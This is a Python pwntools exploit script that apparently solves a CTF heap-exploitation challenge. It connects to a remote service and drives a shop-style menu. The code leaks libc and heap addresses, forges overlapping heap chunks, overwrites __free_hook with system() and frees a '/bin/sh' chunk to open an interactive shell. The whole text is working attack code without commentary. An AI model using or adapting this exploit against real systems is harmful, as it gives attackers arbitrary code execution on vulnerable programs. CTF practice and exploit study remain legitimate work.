from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

debug = 0
if debug == 1:
	elf = change_ld('./pwn', './ld-2.23.so')
	p = elf.process(env={'LD_PRELOAD':'./libc-2.23.so'})
else:
	p = remote('47.111.59.243', 10001)

def purchase(size, name, price):
	p.recvuntil('>>>')
	p.sendline('1')
	p.recvuntil('length:')
	p.sendline(str(size))
	p.recvuntil('Name:')
	p.sendline(name)
	p.recvuntil('Price:')
	p.sendline(str(price))

def comment(idx, comment, score):
	p.recvuntil('>>>')
	p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(idx))
	p.recvuntil(' :')
	p.send(comment)
	p.recvuntil('score:')
	p.sendline(str(score))

def throw(idx):
	p.recvuntil('>>>')
	p.sendline('3')
	p.recvuntil('index:')
	p.sendline(str(idx))

def rename(idx, name, text):
	p.recvuntil('>>>')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.sendline(name)
	p.recvuntil('(y/n)')
	p.sendline('y')
	p.recvuntil('serial:')
	p.sendline('e4SyD1C!')
	p.recvuntil('Pwner')
	p.send(text)
#gdb.attach(p)

#leak libc heap
purchase(0x8c, 'kotori', 1)
purchase(0x8c, 'kotori', 1)
purchase(0x8c, 'kotori', 1)
throw(0)
throw(1)
comment(2, 'A', 0)
throw(2)
s = p.recvline()[9: 17]
main_arena = u32(s[0: 4]) + 0x3f
heap = u32(s[4: ]) - 0xf0
libc_base = main_arena - 0x1b0780
free_hook = libc_base + 0x1b18b0
system_addr = libc_base + 0x3a940
print hex(libc_base)
print hex(heap)

#clean heap
purchase(0x140, '\x00' * 0x13c + p32(0x41), 1)	#0
purchase(0x10, 'kotori', 1)
purchase(0x10, 'kotori', 1)
purchase(0x10, 'kotori', 1)
purchase(0x10, 'kotori', 1)
throw(1)
throw(2)
throw(3)
throw(4)

#overlap
purchase(0x54,'A' * 0x50, 1)#1
purchase(0x150, 'A'*0x100 + p32(0x100) , 1)#2
purchase(0x50, 'kotori', 1)#3
purchase(0x20, '/bin/sh', 1)#4

throw(2)
throw(1)
purchase(0x54,'A' * 0x50 + p32(0x58) , 1)#1
purchase(0x50, 'kotori', 1)#2
purchase(0x3c, 'kotori', 1)#5
purchase(0x2c, 'kotori', 1)#6
throw(2)
throw(3)
#gdb.attach(p)
throw(5)
throw(6)

payload = p32(0) * 20 + p32(0x58) + p32(0x41) + p32(main_arena + 0x14) + p32(0) * 14 + p32(0x31) + p32(0x41)
purchase(0x100, payload, 1)#2
purchase(0x2c, 'kotori', 1)
purchase(0x3c, 'kotori', 1)
purchase(0x3c, p32(0) * 5 + p32(main_arena - 0x20), 1)
#gdb.attach(p)
purchase(0x100, p32(0) * 18 + p32(free_hook - 0x6c8), 1)
#purchase(0x100, p32(0) * 18 + p32(free_hook - 0x30), 1)

'''
payload = p32(0) * 20 + p32(0x58) + p32(0x41) + p32(main_arena + 0x14) + p32(0) * 14 + p32(0x31) + p32(0x41)
purchase(0x100, payload, 1)#2
purchase(0x2c, 'kotori', 1)
purchase(0x3c, 'kotori', 1)
#gdb.attach(p)
purchase(0x3c, p32(0) * 5 + p32(free_hook - 0x6c8), 1)
#gdb.attach(p)
'''
purchase(0x200, '\x00', 1)
purchase(0x200, '\x00', 1)
purchase(0x200, '\x00', 1)
purchase(0x200, p32(0) * 29 + p32(1) + p32(2) + p32(0xf7e02700) + p32(0) * 10 + p32(system_addr), 1)
#gdb.attach(p)
throw(4)

p.interactive()
